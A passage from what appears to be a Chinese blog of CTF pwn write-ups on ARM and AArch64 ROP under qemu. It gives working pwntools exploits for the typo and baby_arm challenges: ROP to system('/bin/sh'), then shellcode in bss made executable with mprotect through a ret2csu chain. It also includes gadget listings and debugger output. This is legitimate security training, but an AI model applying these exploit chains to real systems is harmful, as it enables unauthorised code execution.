src="https://storage.tttang.com/media/attachment/2022/08/08/52adb389-70d5-47e4-ad78-90b984509b1a.png" alt="vmxJje.png"></a></p><p><code>lwz</code>将栈上的值赋给<code>r9</code>，再用<code>mr</code>把<code>r9</code>赋给<code>r3</code>，其实就是在传递函数的返回值`n</p><p><code>addi</code>把上一个栈帧的栈顶地址存到<code>r11</code>里，然后索引到存放<code>lr</code>返回地址的位置把值放进<code>r0</code>，再通过<code>mtlr r0</code>把<code>r0</code>的值赋给<code>lr</code>寄存器，从而完成了返回地址的恢复。</p><p>接着<code>lwz r31, -4(r11)</code>即以上一个栈帧栈顶位置减4为有效地址取值存入<code>r31</code>，这一步是在恢复<code>r31</code>寄存器，对应开头进入函数时<code>stw r31, 0x60+var_4(r1)</code>在栈上保存的<code>r31</code>的值，因为它是非易失性寄存器需要恢复。</p><p>再把<code>r11</code>的值给<code>r1</code>，从而<code>r1</code>恢复指向原栈帧的栈顶，完成了函数的退栈操作。到这里也可以看出在ppc中是通过栈顶指针完成栈帧的开辟和弹出的，栈顶指针以链表形式链接，同时对局部变量的操作也是以栈顶为基址进行偏移索引的。</p><p>最后<code>blr</code>返回到原函数继续向下执行</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>异构ROP</title>
      <link href="/posts/19037/"/>
      <url>/posts/19037/</url>
      
        <content type="html"><![CDATA[<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>对于异构的rop与x86下其实并没有多大差异</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在<code>CTF</code>比赛中，绝大多数异架构的题都是在<code>qemu</code>模拟出的环境中跑的</p><p>而<strong><code>qemu</code>有些不太安全的特性</strong>，比如它<strong>没有地址的随机化</strong>，<strong>也没有<code>NX</code>保护</strong>，即使题目所给的二进制文件开了<code>NX</code>和<code>PIE</code>保护，也只是对真机环境奏效，而在<code>qemu</code>中跑的时候，仍然相当于没有这些保护</p><p>也就是说，<strong><code>qemu</code>中所有地址都是有可执行权限的（包括堆栈，甚至<code>bss</code>段等）</strong>，然后<code>libc_base</code>和<code>elf_base</code>每次跑都是固定的，当然这个固定是指在同一个环境下，本地跑和远程跑的这个固定值极有可能不相同，因此有时候打远程仍需泄露<code>libc_base</code>这些信息（当然也可以选择爆破，一般和本地也就差一两位的样子）。</p><p><u>不过在比较新的版本qemu似乎支持这些保护,也就导致之前的任意shellcode失效</u></p><h1 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h1><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>异构pwn主要也是rop利用,利用手法和x86并无多大差异</p><p>和x86比较不同的是函数调用的指令：</p><ul><li>x86采用call和ret完成函数调用，原理是把返回地址压栈</li><li>而arm采用b系列指令完成跳转，pop pc的方式回到父函数调用处</li><li>b系列指令中的bl指令把返回地址存到了lr寄存器中，函数返回时把原来的lr寄存器的值弄到pc里</li><li>所以其实换汤不换药，x86和arm的思路都是差不多，只不过arm多了个lr寄存器，在叶子函数里省的把返回地址压栈了</li></ul><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>在<code>CTF</code>比赛中，绝大多数<code>ARM</code>架构的题都是在<code>qemu</code>模拟出的环境中跑的</p><p>而<strong><code>qemu</code>有些不太安全的特性</strong>，比如它<strong>没有地址的随机化</strong>，<strong>也没有<code>NX</code>保护</strong>，即使题目所给的二进制文件开了<code>NX</code>和<code>PIE</code>保护，也只是对真机环境奏效，而在<code>qemu</code>中跑的时候，仍然相当于没有这些保护</p><p>也就是说，<strong><code>qemu</code>中所有地址都是有可执行权限的（包括堆栈，甚至<code>bss</code>段等）</strong>，然后<code>libc_base</code>和<code>elf_base</code>每次跑都是固定的，当然这个固定是指在同一个环境下，本地跑和远程跑的这个固定值极有可能不相同，因此有时候打远程仍需泄露<code>libc_base</code>这些信息（当然也可以选择爆破，一般和本地也就差一两位的样子）。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj - typo"></a><strong>jarvisoj - typo</strong></h3><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aichch@sword-shield:~/桌面/pwn$ checksec typo</span><br><span class="line">[*] &#x27;/home/aichch/pwn/typo&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line">aichch@sword-shield:~/桌面/pwn$ file ./typo </span><br><span class="line">./typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br></pre></td></tr></table></figure><p>未开启canary和pie</p><p>又因为是静态链接,所以完全可以在程序中寻找system(‘/bin/sh’)</p><p>程序去除了符号表,要想读明白伪代码并不容易</p><p>对于复杂一些的题目,可能需要利用bindiff之类的工具来恢复符号表</p><p><code>qemu-arm-statically -g 1234 ./typo</code>启动程序</p><p>在按下回车键后,程序会读入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s Do Some Typing Exercise~</span><br><span class="line">Press Enter to get start;</span><br><span class="line">Input ~ if you want to quit</span><br><span class="line"></span><br><span class="line">------Begin------</span><br><span class="line">sulphur</span><br></pre></td></tr></table></figure><p>猜测有溢出,用pwntools验证</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./typo&#x27;</span></span><br><span class="line">p=process([<span class="string">&#x27;qemu-arm-static&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1235&#x27;</span>,<span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">p.sendline()</span><br><span class="line">p.send(cyclic(<span class="number">200</span>))</span><br></pre></td></tr></table></figure><p>程序果然崩溃,并得出偏移112</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Invalid address 0x62616164</span><br><span class="line"></span><br><span class="line"> ► f 0 0x62616164</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164</span><br><span class="line">Finding cyclic pattern of 4 bytes: b&#x27;daab&#x27; (hex: 0x64616162)</span><br><span class="line">Found at offset 112</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>之后就是构造rop,首先要找到system和/bin/sh字符串</p><p>/bin/sh字符串好找,但system函数因为去除符号表就有些难找了,不过我们能够利用/bin/sh字符串是被system调用的,来找到system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0006C384 2F                            unk_6C384 DCB 0x2F ; /                  ; DATA XREF: sub_10BA8+468↑o</span><br><span class="line">.rodata:0006C384                                                                       ; .text:off_110AC↑o</span><br><span class="line">.rodata:0006C385 62 69 6E 2F 73 68 00          aBinSh DCB &quot;bin/sh&quot;,0</span><br></pre></td></tr></table></figure><p>有时可能不会显示这个,应该是程序还没加载完,等待一会并重新进入刷新就会有了</p><p>得到system函数地址10ba8</p><p>接下来就是找gadget了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">ropper -f ./typo --search &#x27;pop&#x27; --quality 1</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching for gadgets: pop</span><br><span class="line"></span><br><span class="line">[INFO] File: ./typo</span><br><span class="line">0x00008d1c: pop &#123;fp, pc&#125;; </span><br><span class="line">0x0001dba4: pop &#123;lr&#125;; bx r3; </span><br><span class="line">0x00008420: pop &#123;pc&#125;; </span><br><span class="line">0x00053078: pop &#123;r0, r1, r2, r3, r4, lr&#125;; bx ip; </span><br><span class="line">0x00020904: pop &#123;r0, r4, pc&#125;; </span><br><span class="line">0x00068bec: pop &#123;r1, pc&#125;; </span><br><span class="line">0x00068bd8: pop &#123;r2, r3&#125;; bx lr; </span><br><span class="line">0x00053d10: pop &#123;r3, lr&#125;; bx r3; </span><br><span class="line">0x00008160: pop &#123;r3, pc&#125;; </span><br><span class="line">0x0000ab0c: pop &#123;r3, r4, r5, pc&#125;; </span><br><span class="line">0x0000a958: pop &#123;r3, r4, r5, r6, r7, pc&#125;; </span><br><span class="line">0x00008a3c: pop &#123;r3, r4, r5, r6, r7, r8, fp, pc&#125;; </span><br><span class="line">0x0000a678: pop &#123;r3, r4, r5, r6, r7, r8, sb, pc&#125;; </span><br><span class="line">0x00008520: pop &#123;r3, r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; </span><br><span class="line">0x00019664: pop &#123;r3, r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; blx r3; </span><br><span class="line">0x00068c68: pop &#123;r3, r4, r5, r6, r7, r8, sl, pc&#125;; </span><br><span class="line">0x00014a70: pop &#123;r3, r4, r7, pc&#125;; </span><br><span class="line">0x00008de8: pop &#123;r4, fp, pc&#125;; </span><br><span class="line">0x00053004: pop &#123;r4, lr&#125;; bx r3; </span><br><span class="line">0x000083b0: pop &#123;r4, pc&#125;; </span><br><span class="line">0x00008eec: pop &#123;r4, r5, fp, pc&#125;; </span><br><span class="line">0x00009284: pop &#123;r4, r5, pc&#125;; </span><br><span class="line">0x000242e0: pop &#123;r4, r5, r6, fp, pc&#125;; </span><br><span class="line">0x000095b8: pop &#123;r4, r5, r6, pc&#125;; </span><br><span class="line">0x000212ec: pop &#123;r4, r5, r6, r7, fp, pc&#125;; </span><br><span class="line">0x000082e8: pop &#123;r4, r5, r6, r7, pc&#125;; </span><br><span class="line">0x00043110: pop &#123;r4, r5, r6, r7, r8, fp, pc&#125;; </span><br><span class="line">0x0001d4e0: pop &#123;r4, r5, r6, r7, r8, lr&#125;; bx r3; </span><br><span class="line">0x00011648: pop &#123;r4, r5, r6, r7, r8, pc&#125;; </span><br><span class="line">0x00048e9c: pop &#123;r4, r5, r6, r7, r8, sb, fp, pc&#125;; </span><br><span class="line">0x000502e4: pop &#123;r4, r5, r6, r7, r8, sb, lr&#125;; bx ip; </span><br><span class="line">0x0000a5a0: pop &#123;r4, r5, r6, r7, r8, sb, pc&#125;; </span><br><span class="line">0x0001ddfc: pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, lr&#125;; bx r3; </span><br><span class="line">0x00033164: pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; </span><br><span class="line">0x0005db14: pop &#123;r4, r5, r6, r7, r8, sb, sl, lr&#125;; bx r3; </span><br><span class="line">0x00011c24: pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;; </span><br><span class="line">0x000553cc: pop &#123;r4, r5, r6, r7, r8, sl, pc&#125;; </span><br><span class="line">0x00055424: pop &#123;r4, r5, r6, r7&#125;; bx lr; </span><br><span class="line">0x00023ed4: pop &#123;r4, r5, r7, pc&#125;; </span><br><span class="line">0x00068728: pop &#123;r4, r5&#125;; bx lr; </span><br><span class="line">0x00023dbc: pop &#123;r4, r7, pc&#125;; </span><br><span class="line">0x00014068: pop &#123;r7, pc&#125;; </span><br><span class="line">0x00048300: pop &#123;r7&#125;; bx lr; </span><br><span class="line">0x00008c58: popeq &#123;r3, pc&#125;; blx r2; </span><br><span class="line">0x00008c18: popeq &#123;r3, pc&#125;; blx r3; </span><br></pre></td></tr></table></figure><p>我们选择这一条<code>0x00020904: pop &#123;r0, r4, pc&#125;;</code></p><p>于是<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process([<span class="string">&#x27;qemu-arm-static&#x27;</span>,<span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">p.sendline()</span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">pop_r0_r4_pc_addr=<span class="number">0x00020904</span></span><br><span class="line">bin_sh_addr=<span class="number">0x0006c384</span></span><br><span class="line">sys_addr=<span class="number">0x00010BA8</span></span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(pop_r0_r4_pc_addr)+p32(bin_sh_addr)+p32(<span class="number">0</span>)+p32(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()     </span><br></pre></td></tr></table></figure><h3 id="2018-上海市大学生网络安全大赛-baby-arm"><a href="#2018-上海市大学生网络安全大赛-baby-arm" class="headerlink" title="2018 上海市大学生网络安全大赛 - baby_arm"></a>2018 上海市大学生网络安全大赛 - baby_arm</h3><p>首先看一下,文件相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped</span><br><span class="line">[*] &#x27;/home/aichch/pwn/arm&#x27;</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>动态链接,没开pie和canary</p><p>ida静态分析一下</p><p>程序很简单,首先是向bss段读取0x200的字符,然后再向栈中变量读入0x200字符,显然存在栈溢出</p><p>不过可以发现,第二个read也并不能修改当前函数的返回地址,因为它的读入地址要比返回地址更高</p><p>发现程序中有调用 <code>mprotect</code> 的代码段</p><p>因此可以有如下思路：</p><ol><li>第一次输入 name 时，在 bss 段写上 shellcode</li><li>通过 rop 调用 mprotect 改变 bss 的权限</li><li>返回到 bss 上的 shellcode</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary=<span class="string">&#x27;./arm&#x27;</span></span><br><span class="line">p=process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/aarch64-linux-gnu&#x27;</span>, <span class="string">&#x27;./arm&#x27;</span>])</span><br><span class="line">e=ELF(<span class="string">&#x27;./arm&#x27;</span>)</span><br><span class="line">mprotect_plt=e.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mprotect_got=e.got[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line">bss_addr=<span class="number">0x411068</span></span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.aarch64.sh())</span><br><span class="line">payload1=shellcode</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Name:&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=offset*<span class="string">b&#x27;a&#x27;</span>+p64(csu1)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(csu2) <span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(mprotect_got)+p64(<span class="number">7</span>)<span class="comment">#x21 x22  分别赋值给了x3 x2</span></span><br><span class="line">payload2+=p64(<span class="number">0x1000</span>)+p64(<span class="number">0x411000</span>)<span class="comment">#x23 x24  分别赋值给了x1 w0</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(bss_addr)<span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x21 x22</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x23 x24</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>以上是常规做法</p><p>但如果能够确定程序是在qemu中运行的,那么程序就没有nx保护,任意地址可执行</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary=<span class="string">&#x27;baby_arm&#x27;</span></span><br><span class="line">p=process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/aarch64-linux-gnu&#x27;</span>, <span class="string">&#x27;baby_arm&#x27;</span>])</span><br><span class="line">e=ELF(<span class="string">&#x27;baby_arm&#x27;</span>)</span><br><span class="line">mprotect_plt=e.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mprotect_got=e.got[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line">bss_addr=<span class="number">0x411068</span></span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.aarch64.sh())</span><br><span class="line">payload1=shellcode</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Name:&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=offset*<span class="string">b&#x27;a&#x27;</span>+p64(bss_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>通常，在调用了 libc.so 的程序中，都会用到 __libc_csu_init() 这个函数来对libc进行初始化</p><p>在init中可以找到它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008AC</span><br><span class="line">.text:00000000004008AC                               loc_4008AC                              ; CODE XREF: init+60↓j</span><br><span class="line">.text:00000000004008AC A3 7A 73 F8                   LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0 E2 03 16 AA                   MOV             X2, X22</span><br><span class="line">.text:00000000004008B4 E1 03 17 AA                   MOV             X1, X23</span><br><span class="line">.text:00000000004008B8 E0 03 18 2A                   MOV             W0, W24</span><br><span class="line">.text:00000000004008BC 73 06 00 91                   ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0 60 00 3F D6                   BLR             X3</span><br><span class="line">.text:00000000004008C0</span><br><span class="line">.text:00000000004008C4 7F 02 14 EB                   CMP             X19, X20</span><br><span class="line">.text:00000000004008C8 21 FF FF 54                   B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008C8</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC                               loc_4008CC                              ; CODE XREF: init+3C↑j</span><br><span class="line">.text:00000000004008CC F3 53 41 A9                   LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0 F5 5B 42 A9                   LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4 F7 63 43 A9                   LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8 FD 7B C4 A8                   LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC C0 03 5F D6                   RET</span><br></pre></td></tr></table></figure><p>先分析下面的loc_4008cc的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">LDP             X29, X30, [SP+var_s0],#0x40                </span><br><span class="line">RET</span><br></pre></td></tr></table></figure><p>第一句这个LDP X19, X20, [SP,#var_s10]就是说将SP+0x10所指向的内容给x19和x20寄存器（x19寄存器拿的是SP+0x10所指向的内容，而x20寄存器拿的是SP+0x18所指向的内容）</p><p>然后第四句这个LDP X29, X30, [SP+var_s0],#0x40的意思是将SP所指向的内容给x29和x30寄存器（x29寄存器拿的是SP所指向的内容，而x30寄存器拿的是SP+0x8所指向的内容），完成这句指令之后，再将SP指针增加0x40个字节。</p><p>然后ret，这个就是返回到x30寄存器所存储的值。</p><p>再结合着刚刚分析的内容，来看一下loc_4008ac的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">MOV             X2, X22</span><br><span class="line">MOV             X1, X23</span><br><span class="line">MOV             W0, W24</span><br><span class="line">ADD             X19, X19, #1</span><br><span class="line">BLR             X3</span><br><span class="line">CMP             X19, X20</span><br><span class="line">B.NE            loc_4008AC</span><br></pre></td></tr></table></figure><p>第一句就是说将x19的值逻辑左移3位，然后加上x21的值，将得到的这个值所指向内容给x3寄存器。（如果我们控制x19的值为0的话，就是说把x21寄存器的值所指向的内容给x3寄存器。</p><p>然后剩下的mov，add就没什么好说的了。</p><p>倒数第三行BLR指令是去跳转到X3寄存器的值，同时把下一个指令的地址存到x30里面。</p><p>然后下面的CMP和x86里面的一样了。</p><p>如此思路就出来了，几乎是跟ret2csu的利用方法一样。有两点需要注意一下。</p><p>第一点就是loc_4008cc中的</p><p>LDP X29, X30, [SP+var_s0],#0x40 这个指令，虽然<strong>它是在这个loc_4008cc函数的最后，但是它传给x29和x30寄存器的时候，拿的是栈顶的值。因此布置栈中数据的时候，栈顶的内容应该是存放的x29和x30的值。</strong></p><p>第二点，<strong>是BLR X3的时候，这个X3的值溯源一下，它是由X21充当指针来指向的，而X21的值又是SP+0x20充当指针来指向的。意思就是说，最终跳转的目标是x21指向的指针</strong></p><h3 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h3><p>文件信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aichch@sword-shield:~/桌面/pwn$ checksec ./wARMup</span><br><span class="line">[*] &#x27;/home/aichch/pwn/wARMup&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">aichch@sword-shield:~/桌面/pwn$ file ./wARMup </span><br><span class="line">./wARMup: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=fbe5794e95d6ea5006ea3137c0120ed945acae17, not stripped</span><br></pre></td></tr></table></figure><p>32位动态链接</p><p>这题主要就是利用由qemu运行的arm程序,尽管程序开启了nx</p><p>但实际运行时依然是任意地址可执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [sp+4h] [bp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to bi0s CTF!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x78</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read调用时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00010530 78 20 A0 E3                   MOV     R2, #0x78 ; &#x27;x&#x27;                 ; nbytes</span><br><span class="line">.text:00010534 03 10 A0 E1                   MOV     R1, R3                          ; buf</span><br><span class="line">.text:00010538 00 00 A0 E3                   MOV     R0, #0                          ; fd</span><br><span class="line">.text:0001053C 8E FF FF EB                   BL      read</span><br></pre></td></tr></table></figure><p>由R3决定第二个参数,恰好程序中存在这样一条gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 